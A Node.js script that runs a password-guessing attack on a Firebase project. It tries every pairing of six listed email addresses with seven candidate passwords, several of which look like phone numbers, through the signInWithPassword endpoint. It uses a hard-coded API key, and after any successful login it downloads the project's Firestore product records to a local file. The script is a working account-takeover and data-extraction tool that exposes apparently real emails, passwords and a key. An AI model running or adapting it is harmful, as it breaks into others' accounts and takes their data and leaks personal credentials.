async function run() {
  const apiKey = "AIzaSyB7FV-3S_pAELSCQoy0HHu2YeQIqfjhdSY";
  
  const emails = [
    'captyuvraj2@gmail.com',
    'badheeadmin@gmail.com',
    'modernfurniturecraft@gmail.com',
    'subhash.bijarina91@hmail.com',
    'testtest@gmail.com',
    'uhdsikar@gmail.com'
  ];

  const passwords = [
    'Yuvi@302013',
    '9413010506',
    '8824536948',
    '8290617309',
    '1234567',
    '004614',
    '123456'
  ];

  console.log("Starting Firebase login attempts...");

  for (const email of emails) {
    for (const password of passwords) {
      try {
        const url = `https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=${apiKey}`;
        const res = await fetch(url, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ email, password, returnSecureToken: true })
        });

        if (res.ok) {
          const authData = await res.json();
          console.log(`\n🎉 SUCCESS! Logged in as ${email} with password "${password}"`);
          const idToken = authData.idToken;
          
          // Now fetch products
          console.log("Fetching products from Firestore...");
          const fetchUrl = `https://firestore.googleapis.com/v1/projects/badhee/databases/(default)/documents/products?pageSize=300`;
          const productsRes = await fetch(fetchUrl, {
            headers: { 'Authorization': `Bearer ${idToken}` }
          });
          
          if (productsRes.ok) {
            const data = await productsRes.json();
            const docs = data.documents || [];
            console.log(`Successfully fetched ${docs.length} products!`);
            
            // Let's write them to a JSON file as backup!
            const fs = require('fs');
            const path = require('path');
            const backupPath = path.join(__dirname, 'firestore_products_backup.json');
            fs.writeFileSync(backupPath, JSON.stringify(docs, null, 2));
            console.log(`Saved products backup to ${backupPath}`);
            return;
          } else {
            console.log(`Logged in but failed to fetch products: ${productsRes.status} ${productsRes.statusText}`);
          }
        }
      } catch (err) {
        // ignore errors
      }
    }
  }

  console.log("\nFinished all login attempts. None succeeded.");
}

run();
